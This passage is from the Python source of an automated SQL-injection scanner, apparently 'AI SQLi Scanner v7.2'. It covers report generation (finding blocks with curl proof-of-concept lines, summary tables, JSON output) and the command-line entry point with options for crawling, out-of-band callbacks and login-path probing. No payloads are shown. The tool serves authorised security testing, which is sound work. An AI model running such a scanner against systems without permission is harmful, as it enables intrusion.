            ai_conf    = finding["claude"].get("confidence", 0)
            ai_verdict = (f"Claude AI: {finding['claude'].get('verdict', '—')} "
                          f"(conf={ai_conf}%)")

        # ── v7.2 Feature 2: timestamp in every finding block ─────────────────
        ts = finding.get("timestamp", "—")

        lines.append(f"{h3}Finding #{index}")
        lines.append(f"{indent}- Timestamp       : {ts}")          # ← NEW
        lines.append(f"{indent}- URL             : {finding.get('url', '—')}")
        lines.append(f"{indent}- Method          : {finding.get('method', '—')}")
        lines.append(f"{indent}- Vector          : {finding.get('vector_type', '—')}")
        lines.append(f"{indent}- Parameter       : {finding.get('param', '—')}")
        lines.append(f"{indent}- Technique       : {finding.get('technique', '—')}")

        payload_line = (
            f"{indent}- Payload         : `{finding.get('payload', '—')}`"
            if is_md else
            f"{indent}- Payload         : {finding.get('payload', '—')}"
        )
        lines.append(payload_line)

        lines.append(f"{indent}- Tag             : {finding.get('tag', '—')}")
        lines.append(f"{indent}- Verdict         : {finding.get('verdict', '—')}")
        lines.append(f"{indent}- Confidence      : {confidence_label}")
        lines.append(f"{indent}- MSS Score       : {mss_score}")
        lines.append(f"{indent}- Response Time   : {finding.get('elapsed', 0):.2f}s")
        lines.append(f"{indent}- Reason          : {finding.get('reason', '—')}")

        if ai_verdict:
            lines.append(f"{indent}- {ai_verdict}")

        fp = finding.get("fp_check", {})
        if fp:
            lines.append(
                f"{indent}- FP Check        : "
                f"{fp.get('checks_passed', '?')}/{fp.get('checks_total', '?')} passed — "
                f"{fp.get('summary', '')[:120]}")

        curl = self._curl_poc(finding)
        if is_md:
            lines.append(f"\n```bash\n{curl}\n```")
        else:
            lines.append(f"{indent}- PoC curl        : {curl}")

        if multi_payload_note:
            note = (
                "> ⚠ Multiple payloads confirm the same vulnerability on this endpoint."
                if is_md else
                "  ⚠  Multiple payloads confirm the same vulnerability on this endpoint."
            )
            lines.append(note)

        lines.append("")
        return lines

    # ── v7.2 Feature 3: FINAL SUMMARY table builder ──────────────────────────
    def _build_final_summary_section(self, confirmed: list, possible: list,
                                     is_md: bool) -> list:
        """
        Returns lines for the FINAL SUMMARY section appended at the end of the
        report.  Produces a compact numbered table of all non-safe findings
        ordered: confirmed first, then possible.
        """
        lines   = []
        H2      = "## " if is_md else "  "
        sep     = "---" if is_md else "═" * 70
        indent  = "    " if not is_md else ""
        all_findings = (
            [dict(f, _section="CONFIRMED") for f in confirmed]
            + [dict(f, _section="POSSIBLE")  for f in possible]
        )

        lines.append(f"{H2}Final Summary")
        lines.append(sep)

        if not all_findings:
            lines.append(f"{indent}No SQL injection findings to summarise.")
            lines.append("")
            return lines

        total_c = len(confirmed)
        total_p = len(possible)
        lines.append(f"{indent}Total findings : {total_c + total_p}  "
                     f"(Confirmed: {total_c}  |  Possible: {total_p})")
        lines.append("")

        if is_md:
            # Markdown table
            lines.append(
                "| # | Status | Method | Vector | Parameter | "
                "URL | Payload (truncated) | Conf% | Time | Timestamp |"
            )
            lines.append(
                "|---|--------|--------|--------|-----------|"
                "----|---------------------|-------|------|-----------|"
            )
            for i, f in enumerate(all_findings, 1):
                status   = f["_section"]
                method   = f.get("method", "—")
                vector   = f.get("vector_type", "—")
                param    = f.get("param", "—")[:20]
                url_s    = f.get("url", "—")
                pl_s     = f.get("payload", "—")[:40].replace("|", "&#124;")
                conf     = f.get("confidence", 0)
                elapsed  = f.get("elapsed", 0.0)
                ts       = f.get("timestamp", "—")
                lines.append(
                    f"| {i} | {status} | {method} | {vector} | `{param}` | "
                    f"`{url_s}` | `{pl_s}` | {conf}% | {elapsed:.2f}s | {ts} |"
                )
        else:
            # Plain-text fixed-width table
            col_w = [4, 10, 7, 10, 18, 42, 32, 6, 7, 21]
            hdr   = (
                f"  {'#':<{col_w[0]}} {'STATUS':<{col_w[1]}} {'METHOD':<{col_w[2]}} "
                f"{'VECTOR':<{col_w[3]}} {'PARAM':<{col_w[4]}} {'URL':<{col_w[5]}} "
                f"{'PAYLOAD':<{col_w[6]}} {'CONF':<{col_w[7]}} {'TIME':<{col_w[8]}} "
                f"TIMESTAMP"
            )
            divider = "  " + "-" * (sum(col_w) + len(col_w) * 1 + 9)
            lines.append(hdr)
            lines.append(divider)
            for i, f in enumerate(all_findings, 1):
                status  = f["_section"]
                method  = f.get("method", "—")
                vector  = f.get("vector_type", "—")
                param   = f.get("param", "—")[:col_w[4]-1]
                url_s   = f.get("url", "—")[:col_w[5]-1]
                pl_s    = f.get("payload", "—")[:col_w[6]-1]
                conf    = str(f.get("confidence", 0)) + "%"
                elapsed = f"{f.get('elapsed', 0.0):.2f}s"
                ts      = f.get("timestamp", "—")
                lines.append(
                    f"  {str(i):<{col_w[0]}} {status:<{col_w[1]}} {method:<{col_w[2]}} "
                    f"{vector:<{col_w[3]}} {param:<{col_w[4]}} {url_s:<{col_w[5]}} "
                    f"{pl_s:<{col_w[6]}} {conf:<{col_w[7]}} {elapsed:<{col_w[8]}} {ts}"
                )
            lines.append(divider)

        lines.append("")

        # Severity badge at the very end
        severity = (
            "HIGH   — Immediate remediation recommended." if confirmed
            else "MEDIUM — Manual review required."       if possible
            else "LOW    — No critical issues detected."
        )
        sev_line = (
            f"**Overall Severity : {severity}**"
            if is_md else
            f"  Overall Severity : {severity}"
        )
        lines.append(sev_line)
        lines.append("")
        lines.append(sep)
        return lines

    def save_report(self, path: str, fmt: str = "txt"):
        is_md  = fmt == "md" or path.endswith(".md")
        H1     = "# "   if is_md else ""
        H2     = "## "  if is_md else "  "
        sep    = "---"  if is_md else "═" * 70
        indent = "    " if not is_md else ""

        lines: list = []
        def w(s: str = ""): lines.append(s)

        confirmed_findings, possible_findings = self._classify_findings(self.results)

        total_tests    = len(self.results)
        total_findings = len(confirmed_findings) + len(possible_findings)
        n_confirmed    = len(confirmed_findings)
        n_possible     = len(possible_findings)
        n_verified_tp  = len(self.true_positive_results)

        confirmed_groups = self._group_findings_by_endpoint(confirmed_findings)
        possible_groups  = self._group_findings_by_endpoint(possible_findings)

        # ─── Header ──────────────────────────────────────────────────────────
        w(f"{H1}SQLi Scanner v7.2 — Security Findings Report")
        w(sep)
        w(f"{'**' if is_md else ''}Target{'**' if is_md else ''}    : {self.target}")
        w(f"{'**' if is_md else ''}Date{'**' if is_md else ''}      : "
          f"{datetime.now():%Y-%m-%d %H:%M:%S}")
        if self.dataset_path:
            w(f"{'**' if is_md else ''}Dataset{'**' if is_md else ''}   : {self.dataset_path}")
        w(f"{'**' if is_md else ''}Logs{'**' if is_md else ''}      : ./{self._log_dir}/")
        w()

        # ─── Summary ─────────────────────────────────────────────────────────
        w(f"{H2}Summary")
        w(sep)
        w(f"{indent}Total Tests Executed          : {total_tests}")
        w(f"{indent}Total Findings                : {total_findings}")
        w(f"{indent}Confirmed Vulnerabilities     : {n_confirmed}")
        w(f"{indent}Possible Vulnerabilities      : {n_possible}")
        w(f"{indent}Verified True Positives (TP)  : {n_verified_tp}")
        w()

        # ─── Confirmed findings ───────────────────────────────────────────────
        section_c = (
            "Confirmed SQL Injection Vulnerabilities (High Confidence)"
            if is_md else
            "  CONFIRMED SQL INJECTION VULNERABILITIES  [High Confidence]"
        )
        w(f"{H2}{section_c}")
        w(sep)

        if not confirmed_findings:
            w(f"{indent}No confirmed SQL injection vulnerabilities detected.")
            w()
        else:
            sorted_confirmed = sorted(
                confirmed_findings,
                key=lambda r: (r.get("url", ""),
                               -r.get("multi_signal", {}).get("total_score", 0))
            )
            seen_eps_c: dict = {}
            idx = 1
            for finding in sorted_confirmed:
                ep_key = (
                    finding.get("url", ""),
                    finding.get("vector_type", "query"),
                    finding.get("param", ""),
                )
                group_size         = len(confirmed_groups.get(ep_key, []))
                multi_payload_note = group_size > 1 and ep_key in seen_eps_c
                for line in self._format_finding_block(
                        finding, "High", is_md, idx,
                        multi_payload_note=multi_payload_note):
                    w(line)
                seen_eps_c[ep_key] = True
                idx += 1

        # ─── Possible findings ────────────────────────────────────────────────
        section_d = (
            "Possible SQL Injection Vulnerabilities (Require Manual Verification)"
            if is_md else
            "  POSSIBLE SQL INJECTION VULNERABILITIES  [Require Manual Verification]"
        )
        w(f"{H2}{section_d}")
        w(sep)

        if not possible_findings:
            w(f"{indent}No low-confidence indicators found.")
            w()
        else:
            sorted_possible = sorted(
                possible_findings,
                key=lambda r: (r.get("url", ""),
                               -r.get("multi_signal", {}).get("total_score", 0))
            )
            seen_eps_p: dict = {}
            idx = 1
            for finding in sorted_possible:
                ep_key = (
                    finding.get("url", ""),
                    finding.get("vector_type", "query"),
                    finding.get("param", ""),
                )
                group_size         = len(possible_groups.get(ep_key, []))
                multi_payload_note = group_size > 1 and ep_key in seen_eps_p
                for line in self._format_finding_block(
                        finding, "Low", is_md, idx,
                        multi_payload_note=multi_payload_note):
                    w(line)
                seen_eps_p[ep_key] = True
                idx += 1

        # ─── Analysis Summary ─────────────────────────────────────────────────
        severity     = ("HIGH"   if n_confirmed > 0
                        else "MEDIUM" if n_possible > 0
                        else "LOW")
        severity_sfx = {
            "HIGH":   " — Immediate remediation recommended.",
            "MEDIUM": " — Manual review required.",
            "LOW":    " — No critical issues detected.",
        }[severity]

        unique_confirmed_eps = len(confirmed_groups)
        unique_possible_eps  = len(possible_groups)

        w(f"{H2}Analysis Summary")
        w(sep)
        w(f"{indent}Total Confirmed Vulnerabilities   : {n_confirmed} "
          f"(across {unique_confirmed_eps} unique endpoint(s))")
        w(f"{indent}Total Possible Indicators         : {n_possible} "
          f"(across {unique_possible_eps} unique endpoint(s))")
        w()

        multi_ep_confirmed = sum(
            1 for g in confirmed_groups.values() if len(g) > 1)
        if multi_ep_confirmed:
            note = (
                f"> Multiple payloads were used to confirm SQL injection on the same "
                f"endpoint for **{multi_ep_confirmed}** endpoint(s). "
                f"Each payload represents an independent attack vector."
            ) if is_md else (
                f"  Multiple payloads were used to confirm SQL injection on the same\n"
                f"  endpoint for {multi_ep_confirmed} endpoint(s). "
                f"Each payload is an independent attack vector."
            )
            w(note)
            w()

        w(f"{indent}Possible findings are low-confidence indicators and require "
          f"manual validation before being treated as confirmed vulnerabilities.")
        w()

        if self.dataset_path and self._dataset and self._dataset.attack_payloads:
            ds_hits = sum(
                1 for r in self.true_positive_results
                if r.get("tag", "").startswith("dataset_"))
            w(f"{indent}Dataset payload hits : {ds_hits} / "
              f"{len(self._dataset.attack_payloads)}")
            w()

        baseline_helps = sum(
            1 for r in self.results
            if r.get("baseline_diff", {}).get("suspicious")
            and r.get("verdict") in ("sqli_confirmed", "sqli_possible"))
        w(f"{indent}Baseline-diff assisted detection : {baseline_helps} finding(s)")
        w()
        w(f"{indent}Per-endpoint scan logs saved to  : ./{self._log_dir}/")
        w()

        sev_line = (
            f"**Overall Severity : {severity}**{severity_sfx}"
            if is_md else
            f"  Overall Severity : {severity}{severity_sfx}"
        )
        w(sev_line)
        w()
        w(sep)
        w()

        # ─── v7.2 Feature 3: FINAL SUMMARY section ───────────────────────────
        for line in self._build_final_summary_section(
                confirmed_findings, possible_findings, is_md):
            w(line)

        # ─── Write text report ────────────────────────────────────────────────
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        print(c(f"\n  Report saved → {path}", GREEN))

        # ─── Write JSON report ────────────────────────────────────────────────
        json_path = path.rsplit(".", 1)[0] + ".json"
        json_payload = {
            "meta": {
                "target":       self.target,
                "date":         datetime.now().isoformat(),
                "dataset":      self.dataset_path,
                "scanner_ver":  "7.2",
                "endpoint_logs_dir": self._log_dir,
            },
            "summary": {
                "total_tests":                total_tests,
                "total_findings":             total_findings,
                "confirmed":                  n_confirmed,
                "possible":                   n_possible,
                "verified_true_positives":    n_verified_tp,
                "severity":                   severity,
                "unique_confirmed_endpoints": unique_confirmed_eps,
                "unique_possible_endpoints":  unique_possible_eps,
            },
            "confirmed_findings": confirmed_findings,
            "possible_findings":  possible_findings,
        }
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(json_payload, f, indent=2, default=str)
        print(c(f"  JSON report  → {json_path}", GREEN))


# ──────────────────────────────────────────────────────────────────────────────
# AUTO-FILENAME HELPER
# ──────────────────────────────────────────────────────────────────────────────

def _auto_report_path(target: str, fmt: str = "txt") -> str:
    parsed   = urllib.parse.urlparse(target)
    hostname = parsed.hostname or "target"
    port     = f"_{parsed.port}" if parsed.port else ""
    safe     = re.sub(r'[^\w.\-]', '_', hostname + port)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"{safe}_sqli_report_{ts}.{fmt}"


# ──────────────────────────────────────────────────────────────────────────────
# INTERACTIVE TARGET PROMPT
# ──────────────────────────────────────────────────────────────────────────────
def prompt_target() -> str:
    print(BANNER)
    print(c("  LEGAL NOTICE:", RED+BOLD))
    print(c("  Only scan systems you own or have explicit written permission to test.", RED))
    print(c("  Unauthorized scanning is illegal.\n", RED))
    while True:
        raw = input(c("  Target URL > ", CYAN+BOLD)).strip()
        if raw:
            if not raw.startswith(("http://","https://")):
                raw = "https://" + raw
            return raw
        print(c("  Please enter a valid URL.", YELLOW))


def prompt_options() -> dict:
    """
    Returns hardcoded defaults (v7.2 — no interactive prompts).
    """
    return {
        "crawl":              True,
        "forms":              True,
        "use_claude":         False,
        "respect_robots":     False,
        "verify_ssl":         True,
        "test_headers":       True,
        "test_cookies":       True,
        "test_second_order":  True,
        "test_oob":           True,
        "test_auth_probe":    True,
        "cookie":             None,
        "profile":            "deep",
        "dataset":            None,
        "server_file":        None,
        "report":             None,
    }


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="AI SQLi Scanner v7.2 — Per-Endpoint Logs + Timestamps + Final Summary",
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--target",        "-t")
    parser.add_argument("--crawl",         "-c", action="store_true")
    parser.add_argument("--forms",         "-f", action="store_true")
    parser.add_argument("--no-claude",           action="store_true")
    parser.add_argument("--no-verify",           action="store_true")
    parser.add_argument("--ignore-robots",       action="store_true")
    parser.add_argument("--no-headers",          action="store_true")
    parser.add_argument("--no-cookies",          action="store_true")
    parser.add_argument("--second-order",        action="store_true")
    parser.add_argument("--oob",                 action="store_true")
    parser.add_argument("--oob-host",            default=OOB_CALLBACK)
    parser.add_argument("--cookie",              help="Cookie header value")
    parser.add_argument("--header",        "-H", action="append", default=[])
    parser.add_argument("--scope",               action="append", default=[])
    parser.add_argument("--delay",               type=float, default=RATE_LIMIT_DELAY)
    parser.add_argument("--report",        "-r", help="Report file (.txt or .md)")
    parser.add_argument("--report-format",       default="txt", choices=["txt","md"])
    parser.add_argument("--profile",             default="standard",
                        choices=list(PROFILES.keys()))
    parser.add_argument("--threads",       "-T", type=int)
    parser.add_argument("--crawl-threads",       type=int)
    parser.add_argument("--quiet",         "-q", action="store_true")
    parser.add_argument("--dataset")
    parser.add_argument("--server-file")
    parser.add_argument("--dataset-max-payloads", type=int, default=DATASET_MAX_PAYLOADS)
    parser.add_argument("--output-json",         help="Write scan results as JSON to this path (pipeline integration)")
    parser.add_argument("--no-auth-probe",       action="store_true",
                        help="Skip guessing common login/auth paths relative to --target "
                             "(the AUTH_PATHS probe in single-target mode). Useful when the "
                             "caller already supplied the exact intended endpoint and doesn't "
                             "want the scan scope silently expanded to ~20 guessed paths, "
                             "especially against sites that return non-404 for unknown paths "
                             "(custom error pages), which makes every guess look like a real "
                             "endpoint worth testing.")

    args = parser.parse_args()

    if args.target:
        prof = PROFILES[args.profile]
        _req_opts.verify_ssl    = not args.no_verify
        _req_opts.rate_delay    = args.delay
        _req_opts.allowed_scope = args.scope or []
        _req_opts.oob_host      = args.oob_host
        extra_hdrs = {}
        if args.cookie: extra_hdrs["Cookie"] = args.cookie
        for h in args.header:
            if ":" in h:
                n, v = h.split(":",1); extra_hdrs[n.strip()] = v.strip()
        _req_opts.extra_headers = extra_hdrs
        target = args.target
        if not target.startswith(("http://","https://")): target = "https://" + target

        report_path = args.report or _auto_report_path(target, fmt=args.report_format)

        opts = {
            "crawl":               args.crawl,
            "forms":               args.forms,
            "use_claude":          not args.no_claude,
            "respect_robots":      not args.ignore_robots,
            "test_headers":        not args.no_headers,
            "test_cookies":        not args.no_cookies,
            "test_second_order":   args.second_order,
            "test_oob":            args.oob,
            "test_auth_probe":     not args.no_auth_probe,
            "report":              report_path,
            "max_payloads":        prof["payloads"],
            "scan_threads":        args.threads        or prof["scan_threads"],
            "crawl_threads":       args.crawl_threads  or prof["crawl_threads"],
            "dataset_path":        args.dataset,
            "server_file":         args.server_file,
            "output_json":         args.output_json,
        }
        verbose = not args.quiet

    else:
        target = prompt_target()
        opts   = prompt_options()
        prof   = PROFILES.get(opts.get("profile", "standard"), PROFILES["standard"])

        opts.setdefault("max_payloads",      prof["payloads"])
        opts.setdefault("scan_threads",      prof["scan_threads"])
        opts.setdefault("crawl_threads",     prof["crawl_threads"])
        opts.setdefault("test_headers",      True)
        opts.setdefault("test_cookies",      True)
        opts.setdefault("test_second_order", True)
        opts.setdefault("test_oob",          True)
        opts.setdefault("dataset_path",      opts.get("dataset"))
        opts.setdefault("server_file",       opts.get("server_file"))

        report_fmt     = "txt"
        opts["report"] = _auto_report_path(target, fmt=report_fmt)
        print(c(f"\n  Report will be saved to: {opts['report']}", CYAN))

        verbose = True
        _req_opts.verify_ssl = opts.get("verify_ssl", True)
        _req_opts.rate_delay = opts.get("delay", RATE_LIMIT_DELAY)
        if opts.get("cookie"):
            _req_opts.extra_headers["Cookie"] = opts["cookie"]

    if opts.get("use_claude", True) and ANTHROPIC_API_KEY == "enter your key":
        print(c("\n  ⚠  Claude AI enabled but API key not set.", YELLOW))
        choice = input(c("  Continue heuristic-only? [y/N] > ", CYAN)).strip().lower()
        if choice != "y": sys.exit(0)
        opts["use_claude"] = False

    scanner = SQLiScanner(
        target            = target,
        use_forms         = opts["forms"],
        use_crawl         = opts["crawl"],
        use_claude        = opts["use_claude"],
        verbose           = verbose,
        max_payloads      = opts["max_payloads"],
        scan_threads      = opts["scan_threads"],
        crawl_threads     = opts["crawl_threads"],
        respect_robots    = opts.get("respect_robots", True),
        test_headers      = opts.get("test_headers", True),
        test_cookies      = opts.get("test_cookies", True),
        test_second_order = opts.get("test_second_order", False),
        test_oob          = opts.get("test_oob", False),
        test_auth_probe   = opts.get("test_auth_probe", True),
        dataset_path      = opts.get("dataset_path"),
        server_file       = opts.get("server_file"),
    )
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(c("\n\n  Scan interrupted.", YELLOW))
        scanner.printer.stop()
        if scanner._ep_log_registry:
            scanner._ep_log_registry.close_all()

    if opts.get("report"):
        fmt = "md" if opts["report"].endswith(".md") else "txt"
        scanner.save_report(opts["report"], fmt=fmt)

    if opts.get("output_json"):
        confirmed = sum(1 for r in scanner.results if r["verdict"] == "sqli_confirmed")
        possible  = sum(1 for r in scanner.results if r["verdict"] == "sqli_possible")
        tested_urls = {r.get("url") for r in scanner.results if r.get("url")}
        payload = {
            "target": scanner.target,
            "summary": {
                "endpoints_tested": len(tested_urls),
                "total_tests": len(scanner.results),
                "confirmed": confirmed,
                "possible": possible,
            },
            "findings": [r for r in scanner.results if r["verdict"] in ("sqli_confirmed", "sqli_possible")],
        }
        with open(opts["output_json"], "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, default=str)
        print(c(f"\n  [+] JSON results written to {opts['output_json']}", GREEN))


if __name__ == "__main__":
    main()